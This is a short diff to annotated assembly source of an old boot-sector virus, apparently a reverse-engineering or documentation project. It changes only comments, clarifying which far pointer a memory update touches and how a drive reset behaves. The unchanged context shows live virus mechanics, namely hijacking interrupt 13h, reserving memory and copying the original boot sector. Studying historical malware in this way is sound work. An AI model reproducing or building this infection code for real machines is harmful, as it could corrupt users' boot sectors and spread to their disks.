@@ -23,7 +23,7 @@ boot_entry:
 v_loading_location:      db k_is_loading_from_floppy
 v_original_int_13h:      dd 0
 v_virus_main_routine:    dw main_routine-boot_entry
-v_unknown_1:             dw 0
+v_unknown_1:             dw 0                    ; segment word of the v_virus_main_routine far pointer
 v_boot_entry:            dw boot_entry, 0
 
 virus_int_13h:
@@ -155,7 +155,7 @@ decrease_available_memory:
       mov cl,0x6                            ; set ES to the virus segment (hole address; convert
       shl ax,cl                             ; from KiB to segments).
       mov es,ax
-      mov [0x7c0f],ax                       ; update segment part of v_boot_entry far pointer
+      mov [0x7c0f],ax                       ; update segment part of v_virus_main_routine far pointer
 
       mov ax,0x15                           ; hijack int 13h
       mov [0x13*4],ax
@@ -177,7 +177,7 @@ main_routine:
 
 ; reset_drive:
 
-      mov ax,0x0            ; reset hard disk - DL (drive) is not specified (!)
+      mov ax,0x0            ; reset the drive selected by DL; this instruction does not select a drive
       int 0x13
 
 ; copy_original_boot_sector:
